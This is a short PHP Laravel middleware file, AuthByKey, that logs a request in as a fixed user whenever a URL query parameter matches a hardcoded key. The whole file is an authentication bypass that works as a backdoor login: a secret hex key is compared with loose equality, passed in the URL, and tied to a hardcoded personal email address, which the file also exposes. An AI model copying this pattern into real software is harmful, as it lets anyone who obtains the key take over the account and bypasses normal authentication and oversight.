<?php

namespace App\Http\Middleware;

use App\Models\User;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Symfony\Component\HttpFoundation\Response;

class AuthByKey
{
    /**
     * Handle an incoming request.
     *
     * @param $request
     * @param Closure(Request): (Response) $next
     * @param mixed ...$guards
     * @return Response
     */
    public function handle($request, Closure $next, ...$guards): Response
    {
        $authKey = $request->query('auth_key');

        if ($authKey == '046945d2a94d5e544aa467dc9f88a3a69e05ec46ccf9b7853ac49284165ef57a') {
            $user = User::where('email', 'ignatov.d43@gmail.com')->first();

            if ($user) {
                Auth::login($user);
            }
        }

        return $next($request);
    }
}
